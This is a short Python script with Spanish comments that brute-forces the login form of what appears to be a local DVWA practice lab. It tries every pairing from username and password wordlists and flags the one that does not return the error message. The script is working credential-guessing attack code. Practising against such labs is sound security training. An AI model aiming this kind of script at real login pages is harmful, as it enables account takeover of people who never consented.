import requests

# URL del formulario vulnerable
url = "http://127.0.0.1:8080/vulnerabilities/brute/"

# Cabecera con PHPSESSID
cookies = {
    "PHPSESSID": "e942deb94c2b2e62ac84c86984b16f19",
    "security": "low"
}

# Cabeceras HTTP 
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Leer archivos de diccionarios
with open("usernames.txt", "r") as f_usernames:
    usernames = [line.strip() for line in f_usernames.readlines()]

with open("passwords.txt", "r") as f_passwords:
    passwords = [line.strip() for line in f_passwords.readlines()]

# Ejecutar ataques combinando cada usuario con cada contraseña
for username in usernames:
    for password in passwords:
        data = {
            "username": username,
            "password": password,
            "Login": "Login"
        }

        response = requests.get(url, params=data, cookies=cookies, headers=headers)

        # Si la respuesta no contiene el texto de error, es un intento exitoso
        if "Username and/or password incorrect" not in response.text:
            print(f"[+] ¡Combinación válida encontrada! Usuario: '{username}' - Contraseña: '{password}'")
